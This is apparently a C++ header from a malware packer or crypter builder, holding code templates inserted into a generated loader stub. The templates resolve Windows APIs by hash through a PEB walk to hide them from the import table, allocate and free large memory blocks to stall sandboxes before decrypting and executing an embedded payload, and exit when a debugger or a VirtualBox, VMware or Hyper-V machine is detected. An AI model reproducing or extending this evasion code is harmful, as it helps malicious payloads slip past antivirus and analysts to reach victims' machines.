#ifndef STUBSTR_H
#define STUBSTR_H

std::string DYN_GLOBALS = R"(
typedef LPVOID (WINAPI* VirtualAlloc_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);

typedef BOOL (WINAPI* VirtualProtect_t)(
    LPVOID lpAddress, 
    SIZE_T dwSize, 
    DWORD flNewProtect, 
    PDWORD lpflOldProtect
);

typedef HMODULE (WINAPI* LoadLibraryA_t)(
    LPCSTR lpLibFileName
);

typedef HANDLE (WINAPI* CreateThread_t)(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);

VirtualAlloc_t pVirtualAlloc = NULL;
VirtualProtect_t pVirtualProtect = NULL;
LoadLibraryA_t pLoadLibraryA = nullptr;
CreateThread_t pCreateThread = nullptr;

DWORD getHashFromString(const char *string){
    size_t strlength = strnlen_s(string, 50);
    DWORD hash = 0x35;

    for(size_t i = 0; i < strlength; i++){
        hash += (hash * 0xab10f29fa + string[i]) & 0xffffffa;
    }

    return hash;
}

typedef struct _LDR_DATA_TABLE_ENTRY_EX {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_EX, *PLDR_DATA_TABLE_ENTRY_EX;

PEB* get_peb() {
    return (PEB*)__readgsqword(0x60);  
}

HMODULE get_dll_base(const wchar_t* name) {
    PEB* peb = get_peb();
    LIST_ENTRY* module_list = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current_entry = module_list->Flink;

    while (current_entry != module_list) {
        auto entry = CONTAINING_RECORD(current_entry, LDR_DATA_TABLE_ENTRY_EX, InMemoryOrderLinks);
        
        wchar_t* module_name = entry->BaseDllName.Buffer;
        if (_wcsicmp(module_name, name) == 0) {
            return (HMODULE)entry->DllBase;
        }
        current_entry = current_entry->Flink;
    }
    return nullptr;
}

void* resolve_addr(HMODULE hModule, const char* name, DWORD hash){
    auto dos_header = (PIMAGE_DOS_HEADER)hModule;
    auto nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos_header->e_lfanew);
    auto export_dir_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    auto export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + export_dir_rva);

    auto names = (DWORD*)((BYTE*)hModule + export_dir->AddressOfNames);
    auto functions = (DWORD*)((BYTE*)hModule + export_dir->AddressOfFunctions);
    auto ordinals = (WORD*)((BYTE*)hModule + export_dir->AddressOfNameOrdinals);

    for(DWORD i  = 0; i < export_dir->NumberOfNames; i++){
        const char *fn_name = (const char*)hModule + names[i];

        // Resolve by name, for the payloads imports that need to be resolved

        if(name && strcmp(fn_name, name) == 0) {
            WORD ordinal = ordinals[i];
            DWORD fn_rva = functions[ordinal];
            return ((BYTE*)hModule + fn_rva);
        }
        // Resolve by hash, for functions that should not be in the stubs IAT
        if(!name){
            DWORD fn_hashed = getHashFromString(fn_name);
            if(fn_hashed == hash){
                WORD ordinal = ordinals[i];
                DWORD fn_rva = functions[ordinal];
                printf("Function: %s (hash: %u) resolved at: %p\n", fn_name, fn_hashed, ((BYTE*)hModule + fn_rva));
                return ((BYTE*)hModule + fn_rva);
            }
        }

    }
    cout << "Failed to resolve address for:\nHash:" << hash << "\nname:" << name << endl;
    return nullptr;
}

void resolve_func_pointers(DWORD *hashes, HMODULE handle){
    pVirtualAlloc = (VirtualAlloc_t)(void*)resolve_addr(handle, 0, hashes[0]);
    pLoadLibraryA = (LoadLibraryA_t)(void*)resolve_addr(handle, 0, hashes[1]);
    pCreateThread = (CreateThread_t)(void*)resolve_addr(handle, 0, hashes[2]);

    void* realLLA = (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    void* realVA = (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
    void* realCT = (void*)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateThread");

    printf("[+] pLoadLibraryA: %p : %p\n", pLoadLibraryA, realLLA);
    printf("[+] pVirtualAlloc: %p : %p\n", pVirtualAlloc, realVA);
    printf("[+] pCreateThread: %p : %p\n", pCreateThread, realCT);

    HMODULE testLib = pLoadLibraryA("kernel32.dll");
    if(!testLib){
        cerr << "pLoadLibraryA failed with error " << GetLastError() << endl;
    }
}

)";

std::string DYN_CALL = R"(
    const wchar_t* name = L"kernel32.dll";
    HMODULE kernel32 = get_dll_base(name);
    /*DWORD_ARRAY_PLACEHOLDER*/
    resolve_func_pointers(hashes, kernel32);
)";

std::string RAND_DEF = R"(
int getRand(){
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(100000000, 150000000);

    return distrib(gen);
}
)";

std::string RAND_CALL = R"(
    int a = getRand();
    int b = getRand();

    char *blocka = NULL;
    blocka = (char *) malloc(a);

    if(blocka != NULL){
        memset(blocka, 00, a);
        free(blocka);

        char *blockb = NULL;
        blockb = (char *) malloc(b);
        if(blockb != NULL){
            memset(blockb, 00, b);
            free(blockb);
            
            vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
            execute(payload);
        }


        
    }

)";

std::string DB_DEF = R"(
void antiDb(){
    
    if(IsDebuggerPresent()){
        //cout << "\nDebugger present\nexiting...";
        exit(0);
    } else {
        //cout << "\nNo debugger found...\n";
    }
}

)";

// Anti-VM Source Edited From: https://github.com/basedpill/detectvm
std::string ANTI_VM_DEF = R"(
bool DetectBySystemManufacturer()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    //System manufacturer
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemManufacturer"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Microsoft Corporation") == 0)
                return true;
        }
    }
    return false;
}
bool DetectByBiosVendor()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("BIOSVendor"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Microsoft Corporation") == 0)
                return true;
        }
    }

    return false;
}

bool DetectBySystemFamily()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemFamily"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Virtual Machine") == 0)
                return true;
        }
    }

    return false;
}

bool DetectByProductName()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemProductName"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Virtual Machine") == 0)
                return true;
        }
    }

    return false;
}

bool IsVboxVM(){
    HANDLE handle = CreateFile(_T("\\\\.\\VBoxMiniRdrDN"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (handle != INVALID_HANDLE_VALUE){CloseHandle(handle); return true;}
    return false;
}

bool IsVMwareVM(){
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = {0}; DWORD dwBufSize = sizeof(buf);
    if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\VMware, Inc.\\VMware Tools"), 0, KEY_QUERY_VALUE, &hKey ) == ERROR_SUCCESS ) {return true;}
    return false;
}

bool IsMsHyperV() {
    //Use multiple known reg entries to indicate Virtual Machines
    return DetectBySystemManufacturer() || DetectByBiosVendor() || DetectBySystemFamily()|| DetectByProductName();
}
void antiVm(){
    bool isVm = false;
    if (IsVboxVM() == true) {
        isVm = true; 
        //printf("Vbox detected");
    } else if (IsVMwareVM() == true) {
        isVm = true; 
        //printf("Vmware detected");
    } else if (IsMsHyperV() == true) {
        isVm = true; 
        //printf("HyperV detected");
    } else { 
        //printf("No VM detected");
    }
    
    if(isVm == true){
        //printf("\nexiting...\n");
        exit(0);
    }
}
)";

string DYN_NO_HASH = R"(
using VirtualAlloc_t = LPVOID (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
using VirtualFree_t = BOOL (WINAPI *)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
using LoadLibraryA_t = HMODULE (WINAPI *)(LPCSTR lpLibFileName);
using CreateThread_t = HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
using WaitForSingleObject_t = DWORD (WINAPI *)(HANDLE hHandle, DWORD dwMilliseconds);
using CloseHandle_t = BOOL (WINAPI *)(HANDLE hObject);

VirtualAlloc_t VA = NULL;
VirtualFree_t VF = NULL;
LoadLibraryA_t LLA = NULL;
CreateThread_t CT = NULL;
WaitForSingleObject_t WFO = NULL;
CloseHandle_t CH = NULL;

)";

#endif //STUBSTR_H
